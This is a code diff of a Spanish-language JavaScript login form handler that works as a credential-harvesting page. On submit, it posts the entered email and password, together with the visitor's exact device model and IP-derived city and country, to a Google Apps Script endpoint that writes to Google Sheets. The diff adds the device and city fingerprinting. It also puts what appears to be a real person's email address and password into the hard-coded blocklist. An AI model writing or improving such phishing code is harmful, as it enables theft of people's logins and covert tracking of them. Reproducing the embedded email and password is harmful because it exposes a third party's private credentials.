@@ -7,14 +7,11 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo@correo.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["holaa2", "holaa1"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
-    
-    // Bandera para indicar si hay contraseña incorrecta
-    let hasInvalidPassword = false;
     
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -25,8 +22,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     }
     
     // Verificar correo prohibido
-    const isProhibitedEmail = prohibitedEmails.includes(email);
-    if (isProhibitedEmail) {
+    if (prohibitedEmails.includes(email)) {
         errorMessage.textContent = "No se encuentra la dirección de correo";
         errorMessage.style.color = 'red';
         emailInput.value = '';
@@ -35,80 +31,58 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     }
     
     // Verificar contraseña prohibida
-    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
-    if (containsProhibitedPassword) {
+    if (prohibitedWords.includes(password)) {
         errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
         errorMessage.style.color = 'red';
-        hasInvalidPassword = true; // Marcamos que hay contraseña incorrecta
         passwordInput.value = '';
-        
-        // No hacemos return aquí para permitir el envío a Sheets
+        return; // Detiene el procesamiento
     }
     
-    // ✅ Detectar si el usuario usa iPhone o Android
-    let deviceType = "Otro"; // Valor por defecto
-    if (/android/i.test(navigator.userAgent)) {
-        deviceType = "Android";
-    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
-        deviceType = "iPhone";
+    // Si pasa todas las validaciones, continúa con el proceso normal
+    if (errorMessage) {
+        errorMessage.textContent = "";
     }
-    
-    // ✅ Obtener el país del usuario desde la API
+
+    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO 🔥
+    let deviceModel = "Desconocido";
+    let userAgent = navigator.userAgent.toLowerCase();
+
+    if (/android/.test(userAgent)) {
+        let match = userAgent.match(/android\s([0-9\.]+);?\s(\S+\s\S+)/);
+        deviceModel = match ? match[2] : "Android Genérico";
+    } else if (/iphone|ipad|ipod/.test(userAgent)) {
+        let match = userAgent.match(/\((.*?)\)/);
+        deviceModel = match ? match[1].split(";")[0] : "iOS Genérico";
+    }
+
+    // 🔥 OBTENER CIUDAD Y PAÍS 🔥
     let country = "Desconocido";
+    let city = "Desconocida";
+
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
         if (data && data.country) {
             country = data.country; // Captura el país
         }
+        if (data && data.city) {
+            city = data.city; // Captura la ciudad
+        }
     } catch (error) {
-        console.error("Error obteniendo el país:", error);
+        console.error("Error obteniendo el país y ciudad:", error);
     }
-    
-    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
+
+    // 🔥 Enviar los datos a Google Sheets 🔥
     const formData = new FormData(this);
-    formData.append("device", deviceType); // Agregar dispositivo
+    formData.append("device", deviceModel); // Agregar modelo exacto del dispositivo
     formData.append("country", country); // Agregar país
-    
-    // Agregar indicación de contraseña incorrecta si aplica
-    if (hasInvalidPassword) {
-        formData.append("status", "CI"); // CI = Contraseña Incorrecta
-    } else {
-        formData.append("status", "OK"); // Estado normal
-    }
-    
-    // ✅ Enviar los datos correctamente a Google Sheets
+    formData.append("city", city); // Agregar ciudad
+
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
+
     fetch(url, {
         method: "POST",
         body: new URLSearchParams(formData),
         headers: { "Content-Type": "application/x-www-form-urlencoded" }
     }).catch(error => console.error("Error al enviar datos:", error));
-    
-    // Solo procedemos a mostrar usuario.html si la contraseña es válida
-    if (!hasInvalidPassword) {
-        // Limpiar cualquier mensaje de error previo
-        if (errorMessage) {
-            errorMessage.textContent = "";
-        }
-
-        // Ocultar el formulario
-        document.getElementById("miFormulario").style.display = "none";
-        
-        // Mostrar mensaje "Cargando..."
-        let loadingMessage = document.createElement("p");
-        loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
-        loadingMessage.style.textAlign = "center";
-        document.body.appendChild(loadingMessage);
-        
-        // Cargar usuario.html dentro del iframe sin heredar estilos
-        let iframe = document.getElementById("usuarioFrame");
-        iframe.src = "usuario.html";
-        iframe.style.display = "block"; // Hacer visible el iframe
-        
-        // Eliminar mensaje de carga después de mostrar usuario.html
-        iframe.onload = function() {
-            loadingMessage.remove();
-        };
-    }
 });
